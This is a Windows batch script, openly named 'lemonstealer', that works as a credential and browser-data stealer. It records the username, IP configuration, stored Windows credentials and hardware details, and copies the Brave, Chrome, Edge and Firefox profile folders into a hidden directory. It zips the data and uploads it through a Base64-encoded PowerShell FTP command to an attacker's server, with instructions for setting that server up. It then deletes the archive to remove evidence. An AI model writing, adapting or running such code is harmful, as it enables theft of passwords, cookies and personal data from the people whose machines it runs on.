@echo off
:: Made by petergriuffin123
:: Welcome to lemonstealer!
:: Set file path variables
set "fff=%~d0\db"
set "ffff=%~d0\db.zip"
:: Save username data, IP data, file location data, stored credential data, and hardware data
(
  echo %USERNAME%
  ipconfig
  echo %~d0
  echo %~dp0
  echo %TIME%
  cmdkey /list
  wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed
  wmic path win32_VideoController get Name,AdapterRAM,DriverVersion
) > "%~d0\data.txt"

:: Copy and save data from multiple browsers
xcopy "C:\Users\%username%\AppData\Local\BraveSoftware" "%~d0\db" /E /H /C /I
xcopy "C:\Users\%username%\AppData\Local\Google" "%~d0\db" /E /H /C /I
xcopy "C:\Users\%username%\AppData\Local\Microsoft" "%~d0\db" /E /H /C /I
xcopy "C:\Users\%username%\AppData\Roaming\Mozilla" "%~d0\db" /E /H /C /I
:: Hide the path where the data was saved
attrib +h +s "%~d0\db"
:: Compress the data into a zip file
powershell -command "Compress-Archive -Path '%fff%' -DestinationPath '%ffff%' -Force"
timeout 20 >nul

:: Send zip file over FTP

powershell -EncodedCommand
:: Start an FTP server and configure this with your FTP server's public IP and open port then encode this in Base64 and paste the encoded content in the powershell -EncodedCommand
:: $ftp = "ftp://<FTP's public IP:<FTP's open port>"
:: $user = "user"
:: $pass = "12345"
:: $localFile = "$env:ffff"
:: $webclient = New-Object System.Net.WebClient
:: $webclient.Credentials = New-Object System.Net.NetworkCredential($user, $pass)
:: $webclient.UploadFile($ftp, $localFile)

timeout 20 >nul
:: Erase evidence of file
del "%~d0\db.zip